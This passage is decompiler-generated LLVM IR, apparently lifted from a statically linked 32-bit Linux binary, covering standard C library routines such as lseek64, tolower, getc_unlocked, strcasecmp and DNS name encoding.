  uselistorder i32 44, { 12, 13, 14, 11, 1, 15, 16, 17, 26, 18, 10, 23, 25, 24, 20, 21, 22, 19, 2, 3, 4, 5, 6, 7, 8, 9, 0 }
  uselistorder i32 -44, { 1, 0 }
  uselistorder i32 48, { 11, 4, 3, 12, 13, 14, 0, 8, 5, 1, 10, 6, 7, 15, 16, 17, 18, 2, 9 }
  uselistorder i32 -48, { 1, 2, 4, 3, 0 }
  uselistorder i32 -32, { 4, 0, 1, 2, 3 }
  uselistorder i32 32, { 67, 0, 68, 69, 35, 37, 70, 71, 72, 73, 74, 36, 75, 76, 77, 52, 53, 78, 92, 38, 61, 65, 66, 6, 5, 7, 8, 54, 9, 10, 62, 11, 12, 13, 14, 15, 1, 79, 80, 2, 81, 82, 83, 84, 85, 86, 87, 16, 88, 55, 90, 91, 89, 63, 64, 18, 17, 42, 20, 19, 41, 22, 21, 43, 40, 23, 56, 57, 24, 58, 3, 26, 25, 44, 28, 27, 45, 46, 59, 4, 47, 29, 30, 32, 31, 48, 50, 34, 33, 49, 51, 39, 60 }
  uselistorder i32* @ebp, { 76, 77, 78, 79, 80, 81, 82, 83, 84, 85, 86, 87, 88, 89, 90, 9, 10, 11, 12, 13, 14, 15, 2, 91, 92, 93, 98, 94, 95, 96, 97, 99, 100, 0, 101, 102, 103, 104, 105, 106, 107, 108, 109, 110, 111, 112, 113, 114, 115, 116, 117, 118, 119, 120, 121, 122, 123, 124, 125, 126, 127, 128, 129, 130, 131, 132, 133, 134, 135, 136, 137, 138, 139, 140, 141, 142, 143, 144, 145, 146, 147, 148, 149, 150, 151, 152, 153, 47, 48, 16, 17, 18, 52, 53, 201, 202, 203, 204, 205, 206, 207, 208, 209, 210, 211, 212, 213, 218, 214, 215, 216, 217, 1, 219, 176, 177, 178, 179, 180, 181, 182, 183, 184, 185, 186, 4, 154, 155, 156, 157, 158, 159, 160, 161, 162, 163, 164, 165, 166, 167, 168, 169, 170, 171, 172, 173, 174, 3, 175, 6, 7, 8, 49, 50, 51, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 5, 60, 61, 54, 55, 56, 57, 58, 59, 62, 63, 64, 65, 66, 67, 68, 69, 70, 71, 72, 73, 74, 75, 187, 188, 189, 190, 191, 192, 193, 194, 195, 196, 197, 198, 199, 200, 220, 221, 222, 225, 226, 223, 224, 227, 228 }
  uselistorder i32 %arg9, { 3, 1, 2, 0 }
  uselistorder i32 %arg8, { 3, 2, 1, 0 }
  uselistorder i32 %arg7, { 1, 0, 2, 3 }
  uselistorder i32 %arg6, { 1, 0, 3, 2 }
  uselistorder label %dec_label_pc_8058609, { 9, 8, 0, 10, 7, 6, 5, 4, 3, 2, 1 }
  uselistorder label %dec_label_pc_80585cf, { 1, 3, 0, 2, 4 }
  uselistorder label %dec_label_pc_8058585, { 1, 0 }
  uselistorder label %dec_label_pc_8058569, { 1, 0 }
  uselistorder label %dec_label_pc_805852c, { 1, 2, 0, 3 }
  uselistorder label %dec_label_pc_80584f3.preheader, { 1, 0 }
  uselistorder label %dec_label_pc_8058519, { 1, 0 }
  uselistorder label %dec_label_pc_80584e7, { 1, 0 }
  uselistorder label %dec_label_pc_80585cf.outer, { 1, 0, 2, 3 }
  uselistorder label %dec_label_pc_80584b9, { 1, 0 }
  uselistorder label %dec_label_pc_805847e, { 1, 0 }
  uselistorder label %dec_label_pc_80583d5, { 1, 0 }
  uselistorder label %dec_label_pc_8058365, { 1, 0 }
}

define i32 @__libc_lseek64(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %esi.global-to-local = alloca i32, align 4
  %tmp = call i32 @__decompiler_undefined_function_0()
  %stack_var_-20 = alloca i32, align 4
  %stack_var_-12 = alloca i32, align 4
  %v0_805861a = load i32, i32* @ebx, align 4
  store i32 %v0_805861a, i32* %stack_var_-12, align 4
  %v2_8058622 = ptrtoint i32* %stack_var_-20 to i32
  store i32 %v2_8058622, i32* %esi.global-to-local, align 4
  %v1_805863c = call i32 @int80_syscall(i32 140)
  store i32 %v1_805863c, i32* %esi.global-to-local, align 4
  %tmp16 = icmp ult i32 %v1_805863c, -4095
  br i1 %tmp16, label %dec_label_pc_8058656, label %dec_label_pc_8058648

dec_label_pc_8058648:                             ; preds = %entry
  %v1_8058648 = call i32 @__errno_location(i32 %arg3)
  %v0_805864d = load i32, i32* %esi.global-to-local, align 4
  %v1_805864d = sub i32 0, %v0_805864d
  %v2_805864f = inttoptr i32 %v1_8058648 to i32*
  store i32 %v1_805864d, i32* %v2_805864f, align 4
  store i32 -1, i32* %esi.global-to-local, align 4
  br label %dec_label_pc_805865a

dec_label_pc_8058656:                             ; preds = %entry
  %v1_8058656 = icmp eq i32 %v1_805863c, 0
  br i1 %v1_8058656, label %dec_label_pc_805865f, label %dec_label_pc_805865a

dec_label_pc_805865a:                             ; preds = %dec_label_pc_8058656, %dec_label_pc_8058648
  %v0_805865a = phi i32 [ %v1_805863c, %dec_label_pc_8058656 ], [ -1, %dec_label_pc_8058648 ]
  %v1_805865c = ashr i32 %v0_805865a, 31
  br label %dec_label_pc_8058667

dec_label_pc_805865f:                             ; preds = %dec_label_pc_8058656
  %v3_805865f = load i32, i32* %stack_var_-20, align 4
  br label %dec_label_pc_8058667

dec_label_pc_8058667:                             ; preds = %dec_label_pc_805865a, %dec_label_pc_805865f
  %v0_805866d = phi i32 [ %v0_805865a, %dec_label_pc_805865a ], [ %v3_805865f, %dec_label_pc_805865f ]
  %storemerge = phi i32 [ %v1_805865c, %dec_label_pc_805865a ], [ %tmp, %dec_label_pc_805865f ]
  store i32 %storemerge, i32* @edx, align 4
  %v2_805866a = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_805866a, i32* @ebx, align 4
  ret i32 %v0_805866d

; uselistorder directives
  uselistorder i32 %v1_805863c, { 1, 2, 0, 3 }
  uselistorder i32 31, { 22, 16, 23, 24, 25, 26, 27, 12, 3, 4, 1, 2, 11, 21, 17, 18, 19, 7, 8, 5, 6, 13, 9, 10, 28, 29, 20, 14, 15, 0 }
  uselistorder i32 140, { 2, 1, 0 }
  uselistorder label %dec_label_pc_8058667, { 1, 0 }
}

define i32 @__GI_tolower(i32 %arg1) local_unnamed_addr {
entry:
  store i32 %arg1, i32* @edx, align 4
  %v1_8058674 = add i32 %arg1, 128
  %v6_805867f = icmp ugt i32 %v1_8058674, 383
  br i1 %v6_805867f, label %dec_label_pc_805868a, label %dec_label_pc_8058681

dec_label_pc_8058681:                             ; preds = %entry
  %v0_8058681 = load i32, i32* bitcast (i32** @global_var_805f4a0.938 to i32*), align 32
  %v2_8058686 = mul i32 %arg1, 2
  %v3_8058686 = add i32 %v0_8058681, %v2_8058686
  %v4_8058686 = inttoptr i32 %v3_8058686 to i16*
  %v5_8058686 = load i16, i16* %v4_8058686, align 2
  %v6_8058686 = sext i16 %v5_8058686 to i32
  store i32 %v6_8058686, i32* @edx, align 4
  br label %dec_label_pc_805868a

dec_label_pc_805868a:                             ; preds = %entry, %dec_label_pc_8058681
  %v0_805868a = phi i32 [ %arg1, %entry ], [ %v6_8058686, %dec_label_pc_8058681 ]
  ret i32 %v0_805868a

; uselistorder directives
  uselistorder label %dec_label_pc_805868a, { 1, 0 }
}

define i32 @getc_unlocked() local_unnamed_addr {
entry:
  %edx.global-to-local = alloca i32, align 4
  %tmp = call i16* @__decompiler_undefined_function_5()
  %stack_var_-5 = alloca i8, align 1
  %v0_8058690 = load i32, i32* @ebx, align 4
  %v4_8058694 = ptrtoint i16* %tmp to i32
  store i32 %v4_8058694, i32* @ebx, align 4
  %v1_8058698 = add i32 %v4_8058694, 16
  %v2_8058698 = inttoptr i32 %v1_8058698 to i32*
  %v3_8058698 = load i32, i32* %v2_8058698, align 4
  %v2_805869b = add i32 %v4_8058694, 24
  %v3_805869b = inttoptr i32 %v2_805869b to i32*
  %v4_805869b = load i32, i32* %v3_805869b, align 4
  %v10_805869b = icmp ult i32 %v3_8058698, %v4_805869b
  br i1 %v10_805869b, label %dec_label_pc_805873d, label %dec_label_pc_80586a4

dec_label_pc_80586a4:                             ; preds = %entry
  %v2_80586a4 = load i16, i16* %tmp, align 2
  %v3_80586a4 = zext i16 %v2_80586a4 to i32
  %v1_80586a7 = and i32 %v3_80586a4, 131
  %v6_80586b1 = icmp ugt i32 %v1_80586a7, 128
  br i1 %v6_80586b1, label %dec_label_pc_80586cb, label %dec_label_pc_80586b3

dec_label_pc_80586b3:                             ; preds = %dec_label_pc_80586a4
  %v0_80586b3 = load i32, i32* @edx, align 4
  %v6_80586bb = call i32 @__stdio_trans2r_o(i16* nonnull %tmp, i32 128, i32 %v0_80586b3, i32 %v0_80586b3)
  %v1_80586c3 = icmp eq i32 %v6_80586bb, 0
  %v1_80586c5 = icmp eq i1 %v1_80586c3, false
  br i1 %v1_80586c5, label %dec_label_pc_8058762, label %dec_label_pc_80586b3.dec_label_pc_80586cb_crit_edge

dec_label_pc_80586b3.dec_label_pc_80586cb_crit_edge: ; preds = %dec_label_pc_80586b3
  %v0_80586cb.pre = load i32, i32* @ebx, align 4
  br label %dec_label_pc_80586cb

dec_label_pc_80586cb:                             ; preds = %dec_label_pc_80586b3.dec_label_pc_80586cb_crit_edge, %dec_label_pc_80586a4
  %v2_80586ff = phi i32 [ %v0_80586cb.pre, %dec_label_pc_80586b3.dec_label_pc_80586cb_crit_edge ], [ %v4_8058694, %dec_label_pc_80586a4 ]
  %v1_80586cb = inttoptr i32 %v2_80586ff to i16*
  %v2_80586cb = load i16, i16* %v1_80586cb, align 2
  %v3_80586cb = zext i16 %v2_80586cb to i32
  store i32 %v3_80586cb, i32* @ecx, align 4
  %v2_80586ce = and i16 %v2_80586cb, 2
  %v3_80586ce = icmp eq i16 %v2_80586ce, 0
  br i1 %v3_80586ce, label %dec_label_pc_80586ee, label %dec_label_pc_80586d3

dec_label_pc_80586d3:                             ; preds = %dec_label_pc_80586cb
  %tmp20 = urem i16 %v2_80586cb, 2
  %v1_80586d5 = zext i16 %tmp20 to i32
  %tmp19 = sub nsw i32 0, %v1_80586d5
  %v2_80586d8 = and i32 %tmp19, 4
  %v3_80586d8 = add i32 %v2_80586ff, 36
  %v4_80586d8 = add i32 %v3_80586d8, %v2_80586d8
  %v5_80586d8 = inttoptr i32 %v4_80586d8 to i8*
  %v6_80586d8 = load i8, i8* %v5_80586d8, align 1
  %v7_80586d8 = zext i8 %v6_80586d8 to i32
  %v8_80586d8 = load i32, i32* @edx, align 4
  %v9_80586d8 = and i32 %v8_80586d8, -256
  %v10_80586d8 = or i32 %v9_80586d8, %v7_80586d8
  store i32 %v10_80586d8, i32* %edx.global-to-local, align 4
  %v1_80586dc = add i16 %v2_80586cb, -1
  store i16 %v1_80586dc, i16* %v1_80586cb, align 2
  %v0_80586e2 = load i32, i32* @ebx, align 4
  %v1_80586e2 = add i32 %v0_80586e2, 40
  %v2_80586e2 = inttoptr i32 %v1_80586e2 to i32*
  store i32 0, i32* %v2_80586e2, align 4
  %v0_80586e9 = load i32, i32* %edx.global-to-local, align 4
  %v1_80586e9 = urem i32 %v0_80586e9, 256
  store i32 %v1_80586e9, i32* @edx, align 4
  br label %dec_label_pc_8058765

dec_label_pc_80586ee:                             ; preds = %dec_label_pc_80586cb
  %v1_80586ee = add i32 %v2_80586ff, 16
  %v2_80586ee = inttoptr i32 %v1_80586ee to i32*
  %v3_80586ee = load i32, i32* %v2_80586ee, align 4
  store i32 %v3_80586ee, i32* @eax, align 4
  %v1_80586f1 = add i32 %v2_80586ff, 20
  %v2_80586f1 = inttoptr i32 %v1_80586f1 to i32*
  %v3_80586f1 = load i32, i32* %v2_80586f1, align 4
  %v15_80586f1 = icmp eq i32 %v3_80586f1, %v3_80586ee
  %v1_80586f4 = icmp eq i1 %v15_80586f1, false
  br i1 %v1_80586f4, label %dec_label_pc_805873d, label %dec_label_pc_80586f6

dec_label_pc_80586f6:                             ; preds = %dec_label_pc_80586ee
  %v1_80586f6 = add i32 %v2_80586ff, 4
  %v2_80586f6 = inttoptr i32 %v1_80586f6 to i32*
  %v3_80586f6 = load i32, i32* %v2_80586f6, align 4
  %v13_80586f6 = icmp eq i32 %v3_80586f6, -2
  %v1_80586fa = icmp eq i1 %v13_80586f6, false
  br i1 %v1_80586fa, label %dec_label_pc_8058704, label %dec_label_pc_80586fc

dec_label_pc_80586fc:                             ; preds = %dec_label_pc_80586f6
  %v1_80586fc = or i32 %v3_80586cb, 4
  store i32 %v1_80586fc, i32* @ecx, align 4
  %v1_80586ff = trunc i32 %v1_80586fc to i16
  store i16 %v1_80586ff, i16* %v1_80586cb, align 2
  br label %dec_label_pc_8058762

dec_label_pc_8058704:                             ; preds = %dec_label_pc_80586f6
  %v3_8058704 = and i16 %v2_80586cb, 768
  %v4_8058704 = icmp eq i16 %v3_8058704, 0
  br i1 %v4_8058704, label %dec_label_pc_8058719, label %dec_label_pc_8058709

dec_label_pc_8058709:                             ; preds = %dec_label_pc_8058704
  %v3_8058711 = call i32 @fflush_unlocked(i16* bitcast (i32** @global_var_805f25c.924 to i16*))
  %v0_8058719.pre = load i32, i32* @ebx, align 4
  br label %dec_label_pc_8058719

dec_label_pc_8058719:                             ; preds = %dec_label_pc_8058704, %dec_label_pc_8058709
  %v0_805874e = phi i32 [ %v2_80586ff, %dec_label_pc_8058704 ], [ %v0_8058719.pre, %dec_label_pc_8058709 ]
  %v1_8058719 = add i32 %v0_805874e, 8
  %v2_8058719 = inttoptr i32 %v1_8058719 to i32*
  %v3_8058719 = load i32, i32* %v2_8058719, align 4
  %v1_805871c = add i32 %v0_805874e, 12
  %v2_805871c = inttoptr i32 %v1_805871c to i32*
  %v3_805871c = load i32, i32* %v2_805871c, align 4
  %v15_805871c = icmp eq i32 %v3_805871c, %v3_8058719
  br i1 %v15_805871c, label %dec_label_pc_8058746, label %dec_label_pc_8058721

dec_label_pc_8058721:                             ; preds = %dec_label_pc_8058719
  %v2_8058724 = add i32 %v0_805874e, 24
  %v3_8058724 = inttoptr i32 %v2_8058724 to i32*
  store i32 %v3_8058719, i32* %v3_8058724, align 4
  %v0_8058727 = load i32, i32* @ebx, align 4
  %v2_8058728 = call i32 @__stdio_rfill(i32 %v0_8058727)
  %v1_8058730 = icmp eq i32 %v2_8058728, 0
  br i1 %v1_8058730, label %dec_label_pc_8058762, label %dec_label_pc_8058734

dec_label_pc_8058734:                             ; preds = %dec_label_pc_8058721
  %v0_8058734 = load i32, i32* @ebx, align 4
  %v1_8058734 = add i32 %v0_8058734, 20
  %v2_8058734 = inttoptr i32 %v1_8058734 to i32*
  %v3_8058734 = load i32, i32* %v2_8058734, align 4
  %v2_8058737 = add i32 %v0_8058734, 24
  %v3_8058737 = inttoptr i32 %v2_8058737 to i32*
  store i32 %v3_8058734, i32* %v3_8058737, align 4
  %v0_805873a = load i32, i32* @ebx, align 4
  %v1_805873a = add i32 %v0_805873a, 16
  %v2_805873a = inttoptr i32 %v1_805873a to i32*
  %v3_805873a = load i32, i32* %v2_805873a, align 4
  br label %dec_label_pc_805873d

dec_label_pc_805873d:                             ; preds = %dec_label_pc_80586ee, %entry, %dec_label_pc_8058734
  %v1_8058741 = phi i32 [ %v2_80586ff, %dec_label_pc_80586ee ], [ %v4_8058694, %entry ], [ %v0_805873a, %dec_label_pc_8058734 ]
  %v0_805873d = phi i32 [ %v3_80586ee, %dec_label_pc_80586ee ], [ %v3_8058698, %entry ], [ %v3_805873a, %dec_label_pc_8058734 ]
  %v1_805873d = inttoptr i32 %v0_805873d to i8*
  %v2_805873d = load i8, i8* %v1_805873d, align 1
  %v3_805873d = zext i8 %v2_805873d to i32
  store i32 %v3_805873d, i32* @edx, align 4
  %v1_8058740 = add i32 %v0_805873d, 1
  %v2_8058741 = add i32 %v1_8058741, 16
  %v3_8058741 = inttoptr i32 %v2_8058741 to i32*
  store i32 %v1_8058740, i32* %v3_8058741, align 4
  %v0_8058768.pre = load i32, i32* @edx, align 4
  br label %dec_label_pc_8058765

dec_label_pc_8058746:                             ; preds = %dec_label_pc_8058719
  %v2_8058749 = ptrtoint i8* %stack_var_-5 to i32
  %v5_805874e = inttoptr i32 %v0_805874e to i16*
  %v5_805874f = call i32 @__stdio_READ(i16* %v5_805874e, i32 %v2_8058749, i32 1)
  %v1_8058757 = icmp eq i32 %v5_805874f, 0
  br i1 %v1_8058757, label %dec_label_pc_8058762, label %dec_label_pc_805875b

dec_label_pc_805875b:                             ; preds = %dec_label_pc_8058746
  %v3_805875b = load i8, i8* %stack_var_-5, align 1
  %v4_805875b = sext i8 %v3_805875b to i32
  store i32 %v4_805875b, i32* @edx, align 4
  br label %dec_label_pc_8058765

dec_label_pc_8058762:                             ; preds = %dec_label_pc_8058746, %dec_label_pc_8058721, %dec_label_pc_80586b3, %dec_label_pc_80586fc
  store i32 -1, i32* @edx, align 4
  br label %dec_label_pc_8058765

dec_label_pc_8058765:                             ; preds = %dec_label_pc_805875b, %dec_label_pc_805873d, %dec_label_pc_80586d3, %dec_label_pc_8058762
  %v0_8058768 = phi i32 [ %v4_805875b, %dec_label_pc_805875b ], [ %v0_8058768.pre, %dec_label_pc_805873d ], [ %v1_80586e9, %dec_label_pc_80586d3 ], [ -1, %dec_label_pc_8058762 ]
  store i32 %v0_8058690, i32* @ebx, align 4
  ret i32 %v0_8058768

; uselistorder directives
  uselistorder i32 %v0_805873d, { 1, 0 }
  uselistorder i32 %v3_8058719, { 1, 0 }
  uselistorder i32 %v0_805874e, { 0, 1, 3, 2 }
  uselistorder i32 %v3_80586ee, { 1, 0, 2 }
  uselistorder i32 %v1_80586e9, { 1, 0 }
  uselistorder i16 %v2_80586cb, { 2, 0, 1, 3, 4 }
  uselistorder i32 %v2_80586ff, { 1, 2, 3, 5, 4, 0, 6 }
  uselistorder i8* %stack_var_-5, { 1, 0 }
  uselistorder i16* @global_var_805f2a0.917, { 1, 0, 2 }
  uselistorder i32 -2, { 0, 2, 6, 15, 16, 1, 14, 18, 19, 3, 5, 4, 20, 7, 8, 9, 17, 10, 11, 12, 13 }
  uselistorder i32 40, { 4, 5, 6, 7, 8, 9, 1, 2, 10, 11, 12, 13, 3, 0 }
  uselistorder i32 -256, { 65, 1, 66, 0, 67, 14, 21, 68, 69, 3, 46, 45, 2, 70, 71, 72, 73, 6, 74, 4, 75, 5, 76, 100, 8, 48, 47, 7, 77, 78, 79, 80, 81, 82, 83, 84, 15, 85, 86, 87, 102, 16, 24, 17, 103, 104, 63, 62, 9, 98, 99, 88, 89, 90, 91, 92, 93, 94, 10, 95, 96, 22, 23, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 11, 12, 49, 50, 51, 52, 53, 54, 55, 56, 57, 58, 59, 60, 61, 18, 19, 20, 13, 64, 97, 101 }
  uselistorder i32 36, { 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 2, 17, 3, 4, 18, 6, 19, 20, 21, 22, 5, 1, 0 }
  uselistorder i16 2, { 0, 3, 1, 2, 4 }
  uselistorder i32 128, { 4, 11, 15, 10, 13, 5, 6, 14, 0, 7, 8, 16, 17, 18, 19, 20, 3, 2, 9, 21, 12, 1 }
  uselistorder i32 131, { 2, 1, 0 }
  uselistorder i32 24, { 22, 23, 24, 25, 26, 27, 28, 29, 0, 30, 5, 11, 21, 12, 31, 32, 33, 34, 35, 36, 37, 38, 2, 13, 14, 15, 16, 17, 18, 3, 19, 4, 6, 7, 8, 9, 10, 20, 1 }
  uselistorder label %dec_label_pc_8058765, { 3, 0, 1, 2 }
  uselistorder label %dec_label_pc_8058762, { 0, 1, 3, 2 }
  uselistorder label %dec_label_pc_805873d, { 2, 0, 1 }
  uselistorder label %dec_label_pc_8058719, { 1, 0 }
}

define i32 @__GI_strcasecmp(i8* %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %v0_805876d = load i32, i32* bitcast (i32** @global_var_805f4a0.938 to i32*), align 32
  %v4_8058776 = ptrtoint i8* %arg1 to i32
  br label %dec_label_pc_805877e

dec_label_pc_805877e:                             ; preds = %dec_label_pc_805879b, %entry
  %storemerge = phi i32 [ %v4_8058776, %entry ], [ %v1_805879c, %dec_label_pc_805879b ]
  %v0_805879c = phi i32 [ %v4_8058776, %entry ], [ %v1_805879c, %dec_label_pc_805879b ]
  %v0_80587a16 = phi i32 [ 0, %entry ], [ %v0_80587a17, %dec_label_pc_805879b ]
  %v0_805879b = phi i32 [ %arg2, %entry ], [ %v1_805879b, %dec_label_pc_805879b ]
  store i32 %storemerge, i32* @ecx, align 4
  %v12_805877e = icmp eq i32 %v0_805879c, %v0_805879b
  %.pre = inttoptr i32 %v0_805879c to i8*
  br i1 %v12_805877e, label %dec_label_pc_8058796, label %dec_label_pc_8058782

dec_label_pc_8058782:                             ; preds = %dec_label_pc_805877e
  %v2_8058782 = load i8, i8* %.pre, align 1
  %v3_8058782 = zext i8 %v2_8058782 to i32
  %v2_8058785 = mul nuw nsw i32 %v3_8058782, 2
  %v3_8058785 = add i32 %v2_8058785, %v0_805876d
  %v4_8058785 = inttoptr i32 %v3_8058785 to i16*
  %v5_8058785 = load i16, i16* %v4_8058785, align 2
  %v6_8058785 = sext i16 %v5_8058785 to i32
  %v1_8058789 = inttoptr i32 %v0_805879b to i8*
  %v2_8058789 = load i8, i8* %v1_8058789, align 1
  %v3_8058789 = zext i8 %v2_8058789 to i32
  %v2_805878c = mul nuw nsw i32 %v3_8058789, 2
  %v3_805878c = add i32 %v2_805878c, %v0_805876d
  %v4_805878c = inttoptr i32 %v3_805878c to i16*
  %v5_805878c = load i16, i16* %v4_805878c, align 2
  %v6_805878c = sext i16 %v5_805878c to i32
  %v2_8058790 = sub nsw i32 %v6_8058785, %v6_805878c
  %v12_8058790 = icmp eq i32 %v2_8058790, 0
  store i32 %v2_8058790, i32* @edx, align 4
  %v1_8058794 = icmp eq i1 %v12_8058790, false
  br i1 %v1_8058794, label %dec_label_pc_805879f, label %dec_label_pc_8058796

dec_label_pc_8058796:                             ; preds = %dec_label_pc_805877e, %dec_label_pc_8058782
  %v0_80587a17 = phi i32 [ %v2_8058790, %dec_label_pc_8058782 ], [ %v0_80587a16, %dec_label_pc_805877e ]
  %v2_8058796 = load i8, i8* %.pre, align 1
  %v3_8058796 = icmp eq i8 %v2_8058796, 0
  br i1 %v3_8058796, label %dec_label_pc_805879f, label %dec_label_pc_805879b

dec_label_pc_805879b:                             ; preds = %dec_label_pc_8058796
  %v1_805879b = add i32 %v0_805879b, 1
  %v1_805879c = add i32 %v0_805879c, 1
  br label %dec_label_pc_805877e

dec_label_pc_805879f:                             ; preds = %dec_label_pc_8058796, %dec_label_pc_8058782
  %v0_80587a1 = phi i32 [ %v0_80587a17, %dec_label_pc_8058796 ], [ %v2_8058790, %dec_label_pc_8058782 ]
  ret i32 %v0_80587a1

; uselistorder directives
  uselistorder i32 %v1_805879c, { 1, 0 }
  uselistorder i32 %v0_80587a17, { 1, 0 }
  uselistorder i32 %v2_8058790, { 1, 0, 2, 3 }
  uselistorder i32 %v0_805879b, { 1, 2, 0 }
  uselistorder i32 %v0_805879c, { 2, 1, 0 }
  uselistorder i32 65536, { 1, 0, 2, 3, 4, 6, 5, 8, 7, 10, 9, 12, 11, 13, 14, 63, 65, 15, 16, 17, 18, 19, 20, 21, 22, 23, 26, 27, 25, 24, 28, 29, 30, 31, 34, 35, 33, 32, 36, 39, 38, 37, 40, 41, 42, 43, 44, 45, 46, 47, 49, 48, 50, 51, 54, 55, 56, 52, 57, 53, 59, 58, 60, 62, 61, 64 }
  uselistorder label %dec_label_pc_8058796, { 1, 0 }
}

define i32 @__encode_dotted(i8* %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6, i32 %arg7) local_unnamed_addr {
entry:
  %ebx.global-to-local = alloca i32, align 4
  %v0_80587a5 = load i32, i32* @edi, align 4
  %v0_80587a6 = load i32, i32* @esi, align 4
  store i32 0, i32* %ebx.global-to-local, align 4
  %v4_80587ad = ptrtoint i8* %arg1 to i32
  store i32 %v4_80587ad, i32* @edi, align 4
  %v1_805880c7 = icmp eq i8* %arg1, null
  br i1 %v1_805880c7, label %dec_label_pc_8058815, label %dec_label_pc_8058810.lr.ph

dec_label_pc_8058810.lr.ph:                       ; preds = %entry
  br label %dec_label_pc_8058810

dec_label_pc_80587b3:                             ; preds = %dec_label_pc_8058810
  %v5_80587b8 = call i32 @__GI_strchr(i8* %v1_8058810, i32 46)
  %v1_80587c0 = icmp eq i32 %v5_80587b8, 0
  br i1 %v1_80587c0, label %dec_label_pc_80587cc, label %dec_label_pc_80587c6

dec_label_pc_80587c6:                             ; preds = %dec_label_pc_80587b3
  %v1_80587c8 = load i32, i32* @edi, align 4
  %v2_80587c8 = sub i32 %v5_80587b8, %v1_80587c8
  br label %dec_label_pc_80587da

dec_label_pc_80587cc:                             ; preds = %dec_label_pc_80587b3
  %v0_80587cf = load i32, i32* @edi, align 4
  %v5_80587cf = inttoptr i32 %v0_80587cf to i8*
  %v3_80587d0 = call i32 @strlen(i8* %v5_80587cf)
  br label %dec_label_pc_80587da

dec_label_pc_80587da:                             ; preds = %dec_label_pc_80587c6, %dec_label_pc_80587cc
  %v0_80587ed = phi i32 [ %v3_80587d0, %dec_label_pc_80587cc ], [ %v2_80587c8, %dec_label_pc_80587c6 ]
  store i32 %v0_80587ed, i32* @esi, align 4
  %v1_80587da = icmp eq i32 %v0_80587ed, 0
  %v3_80587da = trunc i32 %v0_80587ed to i8
  br i1 %v1_80587da, label %dec_label_pc_8058829, label %dec_label_pc_80587de

dec_label_pc_80587de:                             ; preds = %dec_label_pc_80587da
  %v1_80587e2 = load i32, i32* %ebx.global-to-local, align 4
  %v2_80587e2 = sub i32 %arg3, %v1_80587e2
  %v1_80587e4 = add i32 %v2_80587e2, -1
  %v7_80587e5 = icmp ult i32 %v0_80587ed, %v1_80587e4
  %v1_80587e7 = icmp eq i1 %v7_80587e5, false
  br i1 %v1_80587e7, label %dec_label_pc_8058829, label %dec_label_pc_80587e9

dec_label_pc_80587e9:                             ; preds = %dec_label_pc_80587de
  store i32 %arg2, i32* @edx, align 4
  %v4_80587ef = add i32 %v1_80587e2, %arg2
  %v5_80587ef = inttoptr i32 %v4_80587ef to i8*
  store i8 %v3_80587da, i8* %v5_80587ef, align 1
  %v0_80587f2 = load i32, i32* %ebx.global-to-local, align 4
  %v1_80587f2 = add i32 %v0_80587f2, 1
  %v0_80587f4 = load i32, i32* @edx, align 4
  %v0_80587f6 = load i32, i32* @esi, align 4
  %v2_80587f7 = add i32 %v1_80587f2, %v0_80587f4
  %v0_80587f9 = load i32, i32* @edi, align 4
  %v2_80587fa = add i32 %v0_80587f6, %v1_80587f2
  store i32 %v2_80587fa, i32* %ebx.global-to-local, align 4
  %tmp32 = inttoptr i32 %v2_80587f7 to i16*
  %v7_80587fd = call i32 @memcpy(i16* %tmp32, i32 %v0_80587f9, i32 %v0_80587f6)
  %v1_8058809 = add i32 %v5_80587b8, 1
  br i1 %v1_80587c0, label %dec_label_pc_8058815, label %dec_label_pc_805880c

dec_label_pc_805880c:                             ; preds = %dec_label_pc_80587e9
  store i32 %v1_8058809, i32* @edi, align 4
  %v1_805880c = icmp eq i32 %v1_8058809, 0
  br i1 %v1_805880c, label %dec_label_pc_8058815, label %dec_label_pc_8058810

dec_label_pc_8058810:                             ; preds = %dec_label_pc_8058810.lr.ph, %dec_label_pc_805880c
  %v0_80587b7 = phi i32 [ %v4_80587ad, %dec_label_pc_8058810.lr.ph ], [ %v1_8058809, %dec_label_pc_805880c ]
  %v1_8058810 = inttoptr i32 %v0_80587b7 to i8*
  %v2_8058810 = load i8, i8* %v1_8058810, align 1
  %v3_8058810 = icmp eq i8 %v2_8058810, 0
  %v1_8058813 = icmp eq i1 %v3_8058810, false
  br i1 %v1_8058813, label %dec_label_pc_80587b3, label %dec_label_pc_8058815

dec_label_pc_8058815:                             ; preds = %dec_label_pc_805880c, %dec_label_pc_8058810, %dec_label_pc_80587e9, %entry
  %tmp33 = icmp slt i32 %arg3, 1
  br i1 %tmp33, label %dec_label_pc_8058829, label %dec_label_pc_805881c

dec_label_pc_805881c:                             ; preds = %dec_label_pc_8058815
  %v1_8058820 = load i32, i32* %ebx.global-to-local, align 4
  %v2_8058820 = add i32 %v1_8058820, %arg2
  %v3_8058820 = inttoptr i32 %v2_8058820 to i8*
  store i8 0, i8* %v3_8058820, align 1
  %v0_8058824 = load i32, i32* %ebx.global-to-local, align 4
  %v1_8058824 = add i32 %v0_8058824, 1
  br label %dec_label_pc_805882c

dec_label_pc_8058829:                             ; preds = %dec_label_pc_80587de, %dec_label_pc_80587da, %dec_label_pc_8058815
  br label %dec_label_pc_805882c

dec_label_pc_805882c:                             ; preds = %dec_label_pc_805881c, %dec_label_pc_8058829
  %storemerge5 = phi i32 [ %v1_8058824, %dec_label_pc_805881c ], [ -1, %dec_label_pc_8058829 ]
  store i32 %v0_80587a6, i32* @esi, align 4
  store i32 %v0_80587a5, i32* @edi, align 4
  ret i32 %storemerge5

; uselistorder directives
  uselistorder i8* %v1_8058810, { 1, 0 }
  uselistorder i32 %v1_8058809, { 0, 2, 1 }
  uselistorder i32 %v0_80587f6, { 1, 0 }
  uselistorder i32 %v5_80587b8, { 1, 0, 2 }
  uselistorder i32* %ebx.global-to-local, { 1, 2, 0, 3, 4, 5 }
  uselistorder i32 (i8*)* @strlen, { 5, 7, 6, 4, 3, 2, 1, 0, 8 }
